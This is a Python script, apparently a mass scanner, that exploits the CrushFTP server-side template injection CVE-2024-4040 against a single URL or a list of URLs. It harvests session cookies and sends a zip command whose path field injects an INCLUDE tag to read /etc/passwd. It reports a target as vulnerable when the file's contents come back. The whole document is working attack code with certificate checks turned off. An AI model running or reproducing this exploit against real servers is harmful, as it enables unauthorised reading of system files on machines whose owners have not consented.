import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
    }
    try:
        auth_response = requests.get(url, headers=headers, verify=False,allow_redirects=False)
        current_auth_value = auth_response.cookies.get('currentAuth')
        crush_auth_value = auth_response.cookies.get('CrushAuth')
        target= urljoin(url,'/WebInterface/function/?command=zip&c2f={}&path=%3CINCLUDE%3E/etc/passwd%3C/INCLUDE%3E&names=*'.format(current_auth_value))
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Cookie":"currentAuth={};CrushAuth={}".format(current_auth_value,crush_auth_value)
        }
        result_response = requests.get(target, headers=headers, verify=False,allow_redirects=False)
        if result_response.status_code == 200 and 'root' in result_response.text and 'usr' in result_response.text and 'var' in result_response.text:
            print(f"\033[31mDiscovered:{url}: CrushFTP_CVE-2024-4040_SSTI!\033[0m")
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")